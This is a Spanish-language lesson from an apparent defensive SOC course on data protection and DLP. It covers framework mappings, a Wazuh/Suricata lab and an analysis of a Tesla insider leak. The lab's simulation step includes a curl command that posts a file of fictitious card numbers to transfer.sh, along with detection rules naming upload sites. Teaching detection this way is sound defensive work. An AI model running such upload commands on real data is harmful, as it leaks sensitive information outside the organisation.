# Semana 18: Proteccion de datos y DLP

Curso: [Ciberseguridad Defensiva: Operar como SOC](../syllabus.md) · Semana 18 de 20

## Objetivo de la semana
Comprender los principios de clasificación, protección y prevención de fuga de datos (DLP) en entornos empresariales, aplicando marcos como NIST CSF, ISO/IEC 27001:2022, CIS Controls v8 y MITRE ATT&CK (táctica TA0010 Exfiltration). El estudiante aprenderá a diseñar políticas DLP, identificar canales de exfiltración y desplegar controles técnicos con herramientas open source.

## LECTURA
La **Protección de Datos y la Prevención de Pérdida de Datos (DLP)** constituyen la capa final de defensa frente a la exfiltración de información sensible. Mientras que controles como EDR, firewall o IAM buscan impedir el acceso, DLP asume que un atacante o insider malicioso ya posee el dato y busca sacarlo del perímetro. Según el **MITRE ATT&CK**, la táctica **TA0010 (Exfiltration)** agrupa técnicas como T1041 (Exfiltration Over C2 Channel), T1048 (Exfiltration Over Alternative Protocol), T1052 (Exfiltration Over Physical Medium) y T1567 (Exfiltration Over Web Service). Un programa DLP maduro debe mapear detecciones contra estas técnicas.

El estándar **ISO/IEC 27001:2022** incorpora controles específicos en el Anexo A: 5.12 (Clasificación de la información), 5.13 (Etiquetado), 5.14 (Transferencia), 8.12 (DLP) y 8.24 (Uso de criptografía). Por su parte, el **NIST SP 800-53 Rev.5** define la familia **MP (Media Protection)** y **SC (System and Communications Protection)**, mientras que el **NIST Cybersecurity Framework 2.0** ubica DLP dentro de las funciones *Protect (PR.DS)* y *Detect (DE.CM)*. Los **CIS Controls v8** dedican el Control 3 (Data Protection) con subcontroles 3.1 a 3.13, incluyendo inventario de datos, cifrado en tránsito/reposo, y bloqueo de dispositivos extraíbles.

Arquitectónicamente, DLP se despliega en tres puntos: **endpoint (eDLP)**, **red (nDLP)** y **cloud (CASB/DLP)**. Los motores de inspección usan tres métodos: **regex/patrones** (tarjetas, IBAN, DNI), **fingerprinting** (hash de documentos confidenciales) y **Machine Learning/clasificación contextual**. Las fases operativas son: **descubrimiento** (data discovery), **clasificación** (público, interno, confidencial, restringido), **monitorización**, **protección** (bloqueo, cifrado, watermarking) y **respuesta**. El **OWASP Top 10 2021** se relaciona vía A01 (Broken Access Control) y A02 (Cryptographic Failures), mientras que **OWASP DLP Cheat Sheet** y **OWASP MASVS** guían implementaciones.

Un error común es desplegar DLP en modo bloqueo sin fase de tuning: genera falsos positivos masivos (ej. números de tarjetas en PDFs legítimos) y rechazo del negocio. La metodología recomendada es **crawl-walk-run**: 30 días en modo monitor, análisis de incidentes, ajuste de reglas, y solo entonces bloqueo progresivo. Las métricas clave son: tasa de falsos positivos (<5%), tiempo medio de detección (MTTD), tiempo medio de respuesta (MTTR) y cobertura de canales monitorizados.

## EJERCICIO
**Objetivo:** Desplegar un laboratorio DLP funcional capaz de detectar exfiltración de datos sensibles por canales HTTP/S, USB y correo, y mapear las alertas a MITRE ATT&CK.

**Herramientas:** Ubuntu Server 22.04, Windows 10 (VM), **OpenDLP** o **MyDLP Community**, **Wazuh 4.x** con módulo FIM, **Suricata 7** con reglas ET Open, **Sysmon** en Windows, **Zeek**.

**Pasos:**

1. **Inventario y clasificación:** Crea en `/srv/sensitive/` 5 archivos con datos ficticios (tarjetas con regex `\d{16}`, IBAN `ES\d{22}`, DNI `\d{8}[A-Z]`). Etiqueta con `setfattr -n user.classification -v "CONFIDENTIAL"`.
2. **Instalación de Wazuh:** Despliega servidor Wazuh y agente en Windows. Activa FIM sobre `C:\Users\Public\` y `C:\Confidencial\`. Configura `who-data` para auditoría de procesos.
3. **Reglas personalizadas:** En `/var/ossec/etc/rules/local_rules.xml` crea reglas que disparen alerta nivel 12 cuando se copie un archivo con extensión `.xlsx` o `.pdf` desde carpeta confidencial hacia USB (`<field name="target">`).
4. **Inspección de red:** Configura Suricata en modo IDS con reglas que detecten POST HTTP con payloads que contengan patrones de tarjeta (`pcre:"/\d{16}/"`) o subidas a `pastebin.com`, `transfer.sh`, `mega.nz` (T1567).
5. **Simulación de exfiltración:** Ejecuta tres pruebas: (a) `curl -X POST -d @tarjetas.txt https://transfer.sh/`, (b) copia de archivo confidencial a USB, (c) envío por SMTP con `swaks`. Documenta qué alertas se generan.
6. **Mapeo ATT&CK:** Crea una tabla CSV con columnas: *Timestamp, Canal, Técnica ATT&CK, Severidad, Acción*. Ejemplo: `2024-XX-XX, HTTP POST, T1567.002, Alta, Bloqueado`.
7. **Informe:** Entrega un PDF de 3-5 páginas con: arquitectura del lab, capturas de las alertas en Wazuh Dashboard, tabla de mapeo ATT&CK, y 5 recomendaciones de mejora (tuning de reglas, cifrado, MFA en cloud, DLP en endpoint, formación).

**Criterios de éxito:** Al menos 3 de 3 pruebas generan alerta con técnica ATT&CK correctamente asignada; el informe incluye referencias a CIS Control 3 y NIST SP 800-53 MP-7.

## CASO
**Caso real: fuga de datos en Tesla (2023).** En mayo de 2023, el medio *Handelsblatt* reveló que un exempleado de Tesla filtró más de **100 GB de datos confidenciales** —incluyendo 23.000 archivos internos con información de empleados (nombres, direcciones, salarios, números de Seguridad Social), datos de clientes y secretos de producción del Autopilot—. El insider utilizó credenciales legítimas para exportar los datos a un almacenamiento externo, probablemente mediante servicios cloud y dispositivos USB.

**Análisis técnico con marcos:**
- **MITRE ATT&CK:** T1078 (Valid Accounts) → T1567.002 (Exfiltration to Cloud Storage) → T1567.001 (Exfiltration to Code Repository). No hubo explotación de vulnerabilidad; el vector fue un insider con accesos legítimos.
- **Fallo DLP:** Tesla carecía de controles eDLP efectivos sobre endpoints con privilegios elevados, no aplicaba *least privilege* (CIS Control 6.8), y no tenía fingerprinting de documentos internos ni bloqueo de USB para perfiles sensibles.
- **ISO 27001:** Violación de A.5.12 (clasificación), A.8.12 (DLP), A.6.4 (proceso disciplinario) y A.5.15 (control de acceso).
- **Impacto:** Multas potenciales bajo GDPR (datos de empleados europeos), daño reputacional, exposición de IP estratégica (Autopilot) y litigios colectivos.

**Lecciones defensivas:**
1. Implementar **DLP con fingerprinting** sobre repositorios de RRHH e I+D.
2. Aplicar **UEBA** (User and Entity Behavior Analytics) para detectar descargas anómalas (volumen >X GB en horario no laboral).
3. **Just-in-time access** y revocación automática de privilegios al terminar proyectos.
4. **Watermarking dinámico** en documentos para trazabilidad forense.
5. **Exit interviews** con auditoría de accesos y borrado seguro de dispositivos.
6. Correlación SIEM: alerta cuando un usuario accede a >500 archivos en <10 min (regla Sigma `proc_access_win_susp_file_access`).

El caso demuestra que DLP sin **clasificación previa de datos** y sin **cultura de seguridad** es teatro: el 60% de las fugas según Verizon DBIR 2024 involucran insiders, y el 74% de ellas son accidentales o por negligencia, no malicia.

## Recursos abiertos
- NIST SP 800-53 Rev.5 – Familia MP (Media Protection): https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final
- CIS Controls v8 – Control 3 Data Protection: https://www.cisecurity.org/controls/data-protection
- MITRE ATT&CK – Tactic TA0010 Exfiltration: https://attack.mitre.org/tactics/TA0010/
- OWASP Cheat Sheet Series – Input Validation & Data Protection: https://cheatsheetseries.owasp.org/
- Wazuh Documentation (FIM y reglas DLP): https://documentation.wazuh.com/current/index.html

--- [Volver al syllabus](../syllabus.md)
